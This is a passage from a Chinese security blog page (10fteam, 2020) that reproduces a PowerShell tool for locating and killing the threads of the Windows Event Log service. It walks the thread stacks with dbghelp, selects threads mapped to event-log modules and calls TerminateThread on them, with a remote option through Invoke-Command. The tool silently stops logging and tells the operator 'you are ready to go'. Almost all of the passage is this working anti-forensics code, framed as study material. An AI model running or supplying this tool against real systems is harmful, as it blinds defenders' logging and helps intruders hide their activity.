+        ($TypeBuilder.DefineField(&#39;ApCCV&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9d8)
+        ($TypeBuilder.DefineField(&#39;ApDCR&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9e0)
+        ($TypeBuilder.DefineField(&#39;RsPFS&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9e8)
+        ($TypeBuilder.DefineField(&#39;RsBSP&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9f0)
+        ($TypeBuilder.DefineField(&#39;RsBSPSTORE&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9f8)
+        ($TypeBuilder.DefineField(&#39;RsRSC&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa00)
+        ($TypeBuilder.DefineField(&#39;RsRNAT&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa08)
+        ($TypeBuilder.DefineField(&#39;StIPSR&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa10)
+        ($TypeBuilder.DefineField(&#39;StIIP&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa18)
+        ($TypeBuilder.DefineField(&#39;StIFS&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa20)
+        ($TypeBuilder.DefineField(&#39;StFCR&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa28)
+        ($TypeBuilder.DefineField(&#39;Eflag&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa30)
+        ($TypeBuilder.DefineField(&#39;SegCSD&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa38)
+        ($TypeBuilder.DefineField(&#39;SegSSD&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa40)
+        ($TypeBuilder.DefineField(&#39;Cflag&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa48)
+        ($TypeBuilder.DefineField(&#39;StFSR&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa50)
+        ($TypeBuilder.DefineField(&#39;StFIR&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa58)
+        ($TypeBuilder.DefineField(&#39;StFDR&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa60)
+        ($TypeBuilder.DefineField(&#39;UNUSEDPACK&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa68)
+        $Global:IA64_CONTEXT = $TypeBuilder.CreateType()
+        #endregion IA64_CONTEXT
+
+        #endregion STRUCTS
+
+        function local:func {
+            # A helper function used to reduce typing while defining function prototypes for Add-Win32Type. by @mattifestation
+            Param (
+                [Parameter(Position = 0, Mandatory = $true)]
+                [String]$DllName,
+
+                [Parameter(Position = 1, Mandatory = $true)]
+                [string]$FunctionName,
+
+                [Parameter(Position = 2, Mandatory = $true)]
+                [Type]$ReturnType,
+
+                [Parameter(Position = 3)]
+                [Type[]]$ParameterTypes,
+
+                [Parameter(Position = 4)]
+                [Runtime.InteropServices.CallingConvention]$NativeCallingConvention,
+
+                [Parameter(Position = 5)]
+                [Runtime.InteropServices.CharSet]$Charset,
+
+                [Parameter()]
+                [Switch]$SetLastError
+            )
+            $Properties = @{
+                DllName      = $DllName
+                FunctionName = $FunctionName
+                ReturnType   = $ReturnType
+            }
+            if ($ParameterTypes) { $Properties[&#39;ParameterTypes&#39;] = $ParameterTypes }
+            if ($NativeCallingConvention) { $Properties[&#39;NativeCallingConvention&#39;] = $NativeCallingConvention }
+            if ($Charset) { $Properties[&#39;Charset&#39;] = $Charset }
+            if ($SetLastError) { $Properties[&#39;SetLastError&#39;] = $SetLastError }
+            New-Object -TypeName PSObject -Property $Properties
+        }
+        function local:Add-Win32Type {
+            # A helper function used to reduce typing while defining function prototypes for Add-Win32Type. by @mattifestation
+            [OutputType([Hashtable])]
+            Param(
+                [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
+                [String]$DllName,
+
+                [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
+                [String]$FunctionName,
+
+                [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
+                [Type]$ReturnType,
+
+                [Parameter(ValueFromPipelineByPropertyName = $true)]
+                [Type[]]$ParameterTypes,
+
+                [Parameter(ValueFromPipelineByPropertyName = $true)]
+                [Runtime.InteropServices.CallingConvention]$NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
+
+                [Parameter(ValueFromPipelineByPropertyName = $true)]
+                [Runtime.InteropServices.CharSet]$Charset = [Runtime.InteropServices.CharSet]::Auto,
+
+                [Parameter(ValueFromPipelineByPropertyName = $true)]
+                [Switch]$SetLastError,
+
+                [Parameter(Mandatory = $true)]
+                [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]$Module,
+
+                [ValidateNotNull()]
+                [String]$Namespace = &#39;&#39;
+            )
+            BEGIN { $TypeHash = @{} }
+            PROCESS {
+                if ($Module -is [Reflection.Assembly])
+                {
+                    if ($Namespace)
+                    {
+                        $TypeHash[$DllName] = $Module.GetType(&quot;$Namespace.$DllName&quot;)
+                    }
+                    else
+                    {
+                        $TypeHash[$DllName] = $Module.GetType($DllName)
+                    }
+                }
+                else # Define one type for each DLL
+                {
+                    if (!$TypeHash.ContainsKey($DllName))
+                    {
+                        if ($Namespace)
+                        {
+                            $TypeHash[$DllName] = $Module.DefineType(&quot;$Namespace.$DllName&quot;, &#39;Public,BeforeFieldInit&#39;)
+                        }
+                        else
+                        {
+                            $TypeHash[$DllName] = $Module.DefineType($DllName, &#39;Public,BeforeFieldInit&#39;)
+                        }
+                    }
+
+                    $Method = $TypeHash[$DllName].DefineMethod($FunctionName, &#39;Public,Static,PinvokeImpl&#39;, $ReturnType, $ParameterTypes)
+
+                    # Make each ByRef parameter an Out parameter
+                    $i = 1
+                    foreach($Parameter in $ParameterTypes)
+                    {
+                        if ($Parameter.IsByRef)
+                        {
+                            [void]$Method.DefineParameter($i, &#39;Out&#39;, $null)
+                        }
+                        $i++
+                    }
+
+                    $DllImport = [Runtime.InteropServices.DllImportAttribute]
+                    $SetLastErrorField = $DllImport.GetField(&#39;SetLastError&#39;)
+                    $CallingConventionField = $DllImport.GetField(&#39;CallingConvention&#39;)
+                    $CharsetField = $DllImport.GetField(&#39;CharSet&#39;)
+                    if ($SetLastError)
+                    {
+                        $SLEValue = $true
+                    }
+                    else
+                    {
+                        $SLEValue = $false
+                    }
+
+                    # Equivalent to C# version of [DllImport(DllName)]
+                    $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
+                    $DllImportAttribute = New-Object -TypeName Reflection.Emit.CustomAttributeBuilder -ArgumentList ($Constructor, $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(), [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField), [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))
+                    $Method.SetCustomAttribute($DllImportAttribute)
+                }
+            }
+            END {
+                if ($Module -is [Reflection.Assembly])
+                {
+                    return $TypeHash
+                }
+                $ReturnTypes = @{}
+                foreach ($Key in $TypeHash.Keys)
+                {
+                    $Type = $TypeHash[$Key].CreateType()
+                    $ReturnTypes[$Key] = $Type
+                }
+                return $ReturnTypes
+            }
+        }
+        function local:Get-DelegateType {
+            Param (
+                [OutputType([Type])]
+
+                [Parameter( Position = 0)]
+                [Type[]]$Parameters = (New-Object -TypeName Type[] -ArgumentList (0)),
+
+                [Parameter( Position = 1 )]
+                [Type]$ReturnType = [Void]
+            )
+            $Domain = [AppDomain]::CurrentDomain
+            $DynAssembly = New-Object -TypeName System.Reflection.AssemblyName -ArgumentList (&#39;ReflectedDelegate&#39;)
+            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(&#39;InMemoryModule&#39;, $false)
+            $TypeBuilder = $ModuleBuilder.DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [MulticastDelegate])
+            $ConstructorBuilder = $TypeBuilder.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [Reflection.CallingConventions]::Standard, $Parameters)
+            $ConstructorBuilder.SetImplementationFlags(&#39;Runtime, Managed&#39;)
+            $MethodBuilder = $TypeBuilder.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $ReturnType, $Parameters)
+            $MethodBuilder.SetImplementationFlags(&#39;Runtime, Managed&#39;)
+            $TypeBuilder.CreateType()
+        }
+
+        $FunctionDefinitions = @(
+            #Kernel32
+            (func kernel32 OpenProcess ([IntPtr]) @([Int32], [Bool], [Int32]) -SetLastError),
+            (func kernel32 OpenThread ([IntPtr]) @([Int32], [Bool], [Int32]) -SetLastError),
+            (func kernel32 TerminateThread ([IntPtr]) @([Int32], [Int32]) -SetLastError),
+            (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
+            (func kernel32 Wow64SuspendThread ([UInt32]) @([IntPtr]) -SetLastError),
+            (func kernel32 SuspendThread ([UInt32]) @([IntPtr]) -SetLastError),
+            (func kernel32 ResumeThread ([UInt32]) @([IntPtr]) -SetLastError),
+            (func kernel32 Wow64GetThreadContext ([Bool]) @([IntPtr], [IntPtr]) -SetLastError),
+            (func kernel32 GetThreadContext ([Bool]) @([IntPtr], [IntPtr]) -SetLastError),
+            (func kernel32 GetSystemInfo ([Void]) @($SYSTEM_INFO.MakeByRefType()) -SetLastError),
+            (func kernel32 IsWow64Process ([Bool]) @([IntPtr], [Bool].MakeByRefType()) -SetLastError),
+
+            #Psapi
+            (func psapi EnumProcessModulesEx ([Bool]) @([IntPtr], [IntPtr].MakeArrayType(), [UInt32], [UInt32].MakeByRefType(), [Int32]) -SetLastError),
+            (func psapi GetModuleInformation ([Bool]) @([IntPtr], [IntPtr], $MODULE_INFO.MakeByRefType(), [UInt32]) -SetLastError),
+            (func psapi GetModuleBaseNameW ([UInt32]) @([IntPtr], [IntPtr], [Text.StringBuilder], [Int32]) -Charset Unicode -SetLastError),
+            (func psapi GetModuleFileNameExW ([UInt32]) @([IntPtr], [IntPtr], [Text.StringBuilder], [Int32]) -Charset Unicode -SetLastError),
+            (func psapi GetMappedFileNameW ([UInt32]) @([IntPtr], [IntPtr], [Text.StringBuilder], [Int32]) -Charset Unicode -SetLastError),
+
+            #DbgHelp
+            (func dbghelp SymInitialize ([Bool]) @([IntPtr], [String], [Bool]) -SetLastError),
+            (func dbghelp SymCleanup ([Bool]) @([IntPtr]) -SetLastError),
+            (func dbghelp SymFunctionTableAccess64 ([IntPtr]) @([IntPtr], [UInt64]) -SetLastError),
+            (func dbghelp SymGetModuleBase64 ([UInt64]) @([IntPtr], [UInt64]) -SetLastError),
+            (func dbghelp SymGetSymFromAddr64 ([Bool]) @([IntPtr], [UInt64], [UInt64], [IntPtr]) -SetLastError),
+            (func dbghelp SymLoadModuleEx ([UInt64]) @([IntPtr], [IntPtr], [String], [String], [IntPtr], [Int32], [IntPtr], [Int32]) -SetLastError),
+            (func dbghelp StackWalk64 ([Bool]) @([UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [MulticastDelegate], [MulticastDelegate], [MulticastDelegate], [MulticastDelegate]))
+        )
+        $Types = $FunctionDefinitions | Add-Win32Type -Module $ModuleBuilder -Namespace &#39;Win32&#39;
+        $Global:Kernel32 = $Types[&#39;kernel32&#39;]
+        $Global:Psapi = $Types[&#39;psapi&#39;]
+        $Global:Dbghelp = $Types[&#39;dbghelp&#39;]
+
+        function local:Trace-Thread {
+            Param (
+                [Parameter()]
+                [IntPtr]$ProcessHandle,
+
+                [Parameter()]
+                [Int]$ThreadId,
+
+                [Parameter()]
+                [Int]$ProcessId
+            )
+
+            # Get Thread handle
+            if (($hThread = $Kernel32::OpenThread(0x1F03FF, $false, $ThreadId)) -eq 0) {
+                Write-Error &quot;Unable to open handle for thread $ThreadId.&quot;
+                return
+            }
+
+            #region HELPERS
+            function local:Get-SystemInfo {
+                $SystemInfo = [Activator]::CreateInstance($SYSTEM_INFO)
+                [void]$Kernel32::GetSystemInfo([ref]$SystemInfo)
+
+                Write-Output -InputObject $SystemInfo
+            }
+            function local:Import-ModuleSymbols {
+                Param (
+                    [Parameter(Mandatory = $true)]
+                    [IntPtr]$ProcessHandle
+                )
+
+                #Initialize parameters for EPM
+                $cbNeeded = 0
+                if (!$Psapi::EnumProcessModulesEx($ProcessHandle, $null, 0, [ref]$cbNeeded, 3)) {
+                    Write-Error &#39;Failed to get buffer size for module handles.&#39;
+                    return
+                }
+
+                $ArraySize = $cbNeeded / [IntPtr]::Size
+                $hModules = New-Object -TypeName IntPtr[] -ArgumentList $ArraySize
+
+                $cb = $cbNeeded
+                if (!$Psapi::EnumProcessModulesEx($ProcessHandle, $hModules, $cb, [ref]$cbNeeded, 3)) {
+                    Write-Error &#39;Failed to get module handles for process.&#39;
+                    return
+                }
+                for ($i = 0; $i -lt $ArraySize; $i++)
+                {
+                    $ModInfo = [Activator]::CreateInstance($MODULE_INFO)
+                    $lpFileName = New-Object Text.StringBuilder(256)
+                    $lpModuleBaseName = New-Object Text.StringBuilder(32)
+
+                    if (!$Psapi::GetModuleFileNameExW($ProcessHandle, $hModules[$i], $lpFileName, $lpFileName.Capacity)) {
+                        Write-Error &#39;Failed to get module file name.&#39;
+                        continue
+                    }
+                    if (!$Psapi::GetModuleBaseNameW($ProcessHandle, $hModules[$i], $lpModuleBaseName, $lpModuleBaseName.Capacity)) {
+                        Write-Error &quot;Failed to get module base name for $($lpFileName.ToString()).&quot;
+                        continue
+                    }
+                    if (!$Psapi::GetModuleInformation($ProcessHandle, $hModules[$i], [ref]$ModInfo,  [Runtime.InteropServices.Marshal]::SizeOf($ModInfo))) {
+                        Write-Error &quot;Failed to get module information for module $($lpModuleBaseName.ToString()).&quot;
+                        continue
+                    }
+                    [void]$Dbghelp::SymLoadModuleEx($ProcessHandle, [IntPtr]::Zero, $lpFileName.ToString(), $lpModuleBaseName.ToString(), $ModInfo.lpBaseOfDll, [Int32]$ModInfo.SizeOfImage, [IntPtr]::Zero, 0)
+                }
+                Remove-Variable hModules
+            }
+            function local:Convert-UIntToInt {
+                Param(
+                    [Parameter(Position = 0, Mandatory = $true)]
+                    [UInt64]$Value
+                )
+
+                [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
+                return ([BitConverter]::ToInt64($ValueBytes, 0))
+            }
+            function local:Initialize-Stackframe {
+                Param (
+                    [Parameter(Mandatory = $true)]
+                    $OffsetPC,
+
+                    [Parameter(Mandatory = $true)]
+                    $OffsetFrame,
+
+                    [Parameter(Mandatory = $true)]
+                    $OffsetStack,
+
+                    [Parameter()]
+                    $OffsetBStore
+                )
+
+                $StackFrame = [Activator]::CreateInstance($STACKFRAME64)
+                $Addr64 = [Activator]::CreateInstance($ADDRESS64)
+                $Addr64.Mode = 0x03 # Flat
+
+                $Addr64.Offset = $OffsetPC
+                $StackFrame.AddrPC = $Addr64
+
+                $Addr64.Offset = $OffsetFrame
+                $StackFrame.AddrFrame = $Addr64
+
+                $Addr64.Offset = $OffsetStack
+                $StackFrame.AddrStack = $Addr64
+
+                $Addr64.Offset = $OffsetBStore
+                $StackFrame.AddrBStore = $Addr64
+
+                Write-Output -InputObject $StackFrame
+            }
+            function local:Get-SymbolFromAddress {
+                Param (
+                    [Parameter(Mandatory = $true)]
+                    [IntPtr]$ProcessHandle,
+
+                    [Parameter(Mandatory = $true)]
+                    $Address
+                )
+
+                # Initialize params for SymGetSymFromAddr64
+                $Symbol = [Activator]::CreateInstance($IMAGEHLP_SYMBOLW64)
+                $Symbol.SizeOfStruct = [Runtime.InteropServices.Marshal]::SizeOf($Symbol)
+                $Symbol.MaxNameLength = 32
+
+                $lpSymbol = [Runtime.InteropServices.Marshal]::AllocHGlobal($Symbol.SizeOfStruct)
+                [Runtime.InteropServices.Marshal]::StructureToPtr($Symbol, $lpSymbol, $false)
+
+                [void]$Dbghelp::SymGetSymFromAddr64($ProcessHandle, $Address, 0, $lpSymbol)
+
+                $Symbol = [Runtime.InteropServices.Marshal]::PtrToStructure($lpSymbol, [Type]$IMAGEHLP_SYMBOLW64)
+                [Runtime.InteropServices.Marshal]::FreeHGlobal($lpSymbol)
+
+                Write-Output -InputObject $Symbol
+            }
+            #endregion HELPERS
+
+            $SymFunctionTableAccess64Delegate = Get-DelegateType @([IntPtr], [UInt64]) ([IntPtr])
+            $Action = {
+                Param([IntPtr]$ProcessHandle, [UInt64]$AddrBase) $Dbghelp::SymFunctionTableAccess64($ProcessHandle, $AddrBase)
+            }
+            $FunctionTableAccess = $Action -as $SymFunctionTableAccess64Delegate
+
+            $SymGetModuleBase64Delegate = Get-DelegateType @([IntPtr], [UInt64]) ([UInt64])
+            $Action = {
+                Param([IntPtr]$ProcessHandle, [UInt64]$Address) $Dbghelp::SymGetModuleBase64($ProcessHandle, $Address)
+            }
+            $GetModuleBase = $Action -as $SymGetModuleBase64Delegate
+
+            # Initialize some things
+            $lpContextRecord = [IntPtr]::Zero
+            $StackFrame = [Activator]::CreateInstance($STACKFRAME64)
+            $ImageType = 0
+            $Wow64 = $false
+            $SystemInfo = Get-SystemInfo
+
+            # If not x86 processor, check for Wow64 (x86) process
+            if ($SystemInfo.ProcessorArchitecture -ne 0) {
+                if (!$Kernel32::IsWow64Process($ProcessHandle, [ref]$Wow64)) { Write-Error &#39;IsWow64Process failure.&#39; }
+            }
+
+            if ($Wow64)
+            {
+                $ImageType = 0x014C # I386/x86
+
+                Import-ModuleSymbols -ProcessHandle $ProcessHandle
+
+                # Initialize x86 context in memory
+                $ContextRecord = [Activator]::CreateInstance($X86_CONTEXT)
+                $ContextRecord.ContextFlags = 0x1003F #All
+                $lpContextRecord = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($ContextRecord))
+                [Runtime.InteropServices.Marshal]::StructureToPtr($ContextRecord, $lpContextRecord, $false)
+
+                if ($Kernel32::Wow64SuspendThread($hThread) -eq -1) { Write-Error &quot;Unable to suspend thread $ThreadId.&quot; }
+                if (!$Kernel32::Wow64GetThreadContext($hThread, $lpContextRecord)) { Write-Error &quot;Unable tof get context of thread $ThreadId.&quot; }
+
+                $ContextRecord = [Runtime.InteropServices.Marshal]::PtrToStructure($lpContextRecord, [Type]$X86_CONTEXT)
+                $StackFrame = Initialize-Stackframe $ContextRecord.Eip $ContextRecord.Esp $ContextRecord.Ebp $null
+            }
+
+            # If x86 processor
+            elseif ($SystemInfo.ProcessorArchitecture -eq 0)
+            {
+                $ImageType = 0x014C # I386/x86
+
+                Import-ModuleSymbols -ProcessHandle $ProcessHandle
+
+                # Initialize x86 context in memory
+                $ContextRecord = [Activator]::CreateInstance($X86_CONTEXT)
+                $ContextRecord.ContextFlags = 0x1003F #All
+                $lpContextRecord = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($ContextRecord))
+                [Runtime.InteropServices.Marshal]::StructureToPtr($ContextRecord, $lpContextRecord, $false)
+
+                if ($Kernel32::SuspendThread($hThread) -eq -1) { Write-Error &quot;Unable to suspend thread $ThreadId.&quot; }
+                if (!$Kernel32::GetThreadContext($hThread, $lpContextRecord)) { Write-Error &quot;Unable tof get context of thread $ThreadId.&quot; }
+
+                $ContextRecord = [Runtime.InteropServices.Marshal]::PtrToStructure($lpContextRecord, [Type]$X86_CONTEXT)
+                $StackFrame = Initialize-Stackframe $ContextRecord.Eip $ContextRecord.Esp $ContextRecord.Ebp $null
+            }
+
+            # If AMD64 processor
+            elseif ($SystemInfo.ProcessorArchitecture -eq 9)
+            {
+                $ImageType = 0x8664 # AMD64, interesting that MSFT chose the hex 8664 i.e. x86_64 for this constant...
+
+                Import-ModuleSymbols -ProcessHandle $ProcessHandle
+
+                #Initialize AMD64 context in memory
+                $ContextRecord = [Activator]::CreateInstance($AMD64_CONTEXT)
+                $ContextRecord.ContextFlags = 0x10003B #All
+                $lpContextRecord = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($ContextRecord))
+                [Runtime.InteropServices.Marshal]::StructureToPtr($ContextRecord, $lpContextRecord, $false)
+
+                if ($Kernel32::SuspendThread($hThread) -eq -1) { Write-Error &quot;Unable to suspend thread $ThreadId.&quot; }
+                if (!$Kernel32::GetThreadContext($hThread, $lpContextRecord)) { Write-Error &quot;Unable tof get context of thread $ThreadId.&quot; }
+
+                $ContextRecord = [Runtime.InteropServices.Marshal]::PtrToStructure($lpContextRecord, [Type]$AMD64_CONTEXT)
+                $StackFrame = Initialize-Stackframe $ContextRecord.Rip $ContextRecord.Rsp $ContextRecord.Rsp $null
+            }
+
+            #If IA64 processor
+            elseif ($SystemInfo.ProcessorArchitecture -eq 6)
+            {
+                $ImageType = 0x0200 # IA64
+
+                Import-ModuleSymbols -ProcessHandle $ProcessHandle
+
+                #Initialize IA64 context in memory
+                $ContextRecord = [Activator]::CreateInstance($IA64_CONTEXT)
+                $ContextRecord.ContextFlags = 0x8003D #All
+                $lpContextRecord = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($ContextRecord))
+                [Runtime.InteropServices.Marshal]::StructureToPtr($ContextRecord, $lpContextRecord, $false)
+
+                if ($Kernel32::SuspendThread($hThread) -eq -1) { Write-Error &quot;Unable to suspend thread $ThreadId.&quot; }
+                if (!$Kernel32::GetThreadContext($hThread, $lpContextRecord)) { Write-Error &quot;Unable tof get context of thread $ThreadId.&quot; }
+
+                $ContextRecord = [Runtime.InteropServices.Marshal]::PtrToStructure($lpContextRecord, [Type]$IA64_CONTEXT)
+                $StackFrame = Initialize-Stackframe $ContextRecord.StIIP $ContextRecord.IntSp $ContextRecord.RsBSP $ContextRecord.IntSp
+            }
+            $SystemInfo = $null
+
+            # Marshal Stackframe to pointer
+            $lpStackFrame = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($StackFrame))
+            [Runtime.InteropServices.Marshal]::StructureToPtr($StackFrame, $lpStackFrame, $false)
+
+            # Walk the Stack
+            do {
+                # Get Stackframe
+                if (!$Dbghelp::StackWalk64($ImageType, $ProcessHandle, $hThread, $lpStackFrame, $lpContextRecord, $null, $FunctionTableAccess, $GetModuleBase, $null)) {
+                    Write-Error &quot;Unable to get stackframe for thread $ThreadId.&quot;
+                }
+                $StackFrame = [Runtime.InteropServices.Marshal]::PtrToStructure($lpStackFrame, [Type]$STACKFRAME64)
+
+                $MappedFile = New-Object Text.StringBuilder(256)
+                [void]$Psapi::GetMappedFileNameW($ProcessHandle, [IntPtr](Convert-UIntToInt $StackFrame.AddrPC.Offset), $MappedFile, $MappedFile.Capacity)
+
+                $Symbol = Get-SymbolFromAddress -ProcessHandle $ProcessHandle -Address $StackFrame.AddrPC.Offset
+                $SymbolName = (([String]$Symbol.Name).Replace(&#39; &#39;,&#39;&#39;)).TrimEnd([Byte]0)
+
+                $Properties = @{
+                    ProcessId  = $ProcessId
+                    ThreadId   = $ThreadId
+                    AddrPC     = $StackFrame.AddrPC.Offset
+                    AddrReturn = $StackFrame.AddrReturn.Offset
+                    Symbol     = $SymbolName
+                    MappedFile = $MappedFile
+                }
+                New-Object -TypeName PSObject -Property $Properties
+            } until ($StackFrame.AddrReturn.Offset -eq 0) # End of stack reached
+
+            # Cleanup
+            [Runtime.InteropServices.Marshal]::FreeHGlobal($lpStackFrame)
+            [Runtime.InteropServices.Marshal]::FreeHGlobal($lpContextRecord)
+            if ($Kernel32::ResumeThread($hThread) -eq -1) { Write-Error &quot;Unable to resume thread $ThreadId.&quot; }
+            if (!$Kernel32::CloseHandle.Invoke($hThread)) { Write-Error &quot;Unable to close handle for thread $ThreadId.&quot; }
+        }
+
+
+        Write-Host &quot;[*] Enumerating threads of PID: $(Get-WmiObject -Class win32_service -Filter &quot;name = &#39;eventlog&#39;&quot; | select -exp ProcessId)...&quot; -ForegroundColor Yellow
+        foreach ($Process in (Get-Process -Id (Get-WmiObject -Class win32_service -Filter &quot;name = &#39;eventlog&#39;&quot; | select -exp ProcessId)))
+            {
+                if (($ProcessHandle = $Kernel32::OpenProcess(0x1F0FFF, $false, $Process.Id)) -eq 0) {
+                    Write-Error -Message &quot;Unable to open handle for process $($Process.Id)... Moving on.&quot;
+                    continue
+                }
+                if (!$Dbghelp::SymInitialize($ProcessHandle, $null, $false)) {
+                    Write-Error &quot;Unable to initialize symbol handler for process $($Process.Id).... Quitting.&quot;
+                    if (!$Kernel32::CloseHandle.Invoke($ProcessHandle)) { Write-Error &quot;Unable to close handle for process $($Process.Id).&quot; }
+                    break
+                }
+
+                $Process.Threads | ForEach-Object -Process { Trace-Thread -ProcessHandle $ProcessHandle -ThreadId $_.Id -ProcessId $Process.Id }
+
+                if (!$Dbghelp::SymCleanup($ProcessHandle)) { Write-Error &quot;Unable to cleanup symbol resources for process $($Process.Id).&quot; }
+                if (!$Kernel32::CloseHandle.Invoke($ProcessHandle)) { Write-Error &quot;Unable to close handle for process $($Process.Id).&quot; }
+                [GC]::Collect()
+            }
+
+
+    }# End of ScriptBlock
+
+    if ($PSBoundParameters[&#39;ComputerName&#39;]) { $ReturnedObjects = Invoke-Command -ComputerName $ComputerName -ScriptBlock $RemoteScriptBlock -ArgumentList @($Name, $Id) }
+    else { $ReturnedObjects = Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList @($Name, $Id) }
+
+    $eventLogThreads = $ReturnedObjects | Where-Object {$_.MappedFile -like &#39;*evt*&#39;} | %{$_.ThreadId }
+    Write-Host &quot;[*] Parsing Event Log Service Threads...&quot; -ForegroundColor Yellow
+
+    if(!($eventLogThreads)) {
+      Write-Host &quot;[!] There are no Event Log Service Threads, Event Log Service is not working!&quot; -ForegroundColor Red
+      Write-Host &quot;[+] You are ready to go!&quot; -ForegroundColor Green
+      Write-Host &quot;&quot;
+    }
+    else {
+        [array]$array = $eventLogThreads
+
+        for ($i = 0; $i -lt $array.Count; $i++) {
+            $getThread = $Kernel32::OpenThread(0x0001, $false, $($array[$i]))
+            if ($kill = $Kernel32::TerminateThread($getThread, 1)) {Write-Host &quot;[+] Thread $($array[$i]) Succesfully Killed!&quot; -ForegroundColor Green}
+            $close = $Kernel32::CloseHandle($getThread)
+        }
+
+        Write-Host &quot;&quot;
+        Write-Host &quot;[+] All done, you are ready to go!&quot; -ForegroundColor Green
+        Write-Host &quot;&quot;
+    }
+
+
+    [GC]::Collect()
+}</code></pre>
+      
+       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习，禁止非法利用。—— </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>日志</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-07-25, 22:12:45</p>
+    <p><span class="copy-title">最后更新:</span>2020-08-21, 19:57:14</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/%E6%97%A5%E5%BF%97/" title="日志">https://10fteam.github.io/%E6%97%A5%E5%BF%97/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2020 10fteam</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#工具','#知识','#内网渗透','#CS','#C2','#kali','#漏洞','#CTF','#encrypt_decrypt','#HTB','#靶机','#writeup','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#proxy','#linux','#脚本','#MSF','#PHP','#代码审计','#backdoor','#shell','#数据库','#database','#PWN','#python','#注入','#phpmyadmin','#SQL','#中间件','#WAF','#Struts2','#vulhub','#CVE','#mssql','#windows','#mimikatz','#xss','#DOM','#bypass','#cms','#weblogic','#encode_decode','#靶场','#vulnhub','#僵尸网络','#后门','#远控','#免杀','#webshell','#域渗透','#端口','#CDN','#提权','#DLL','#MISC','#逆向','#editor','#log',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
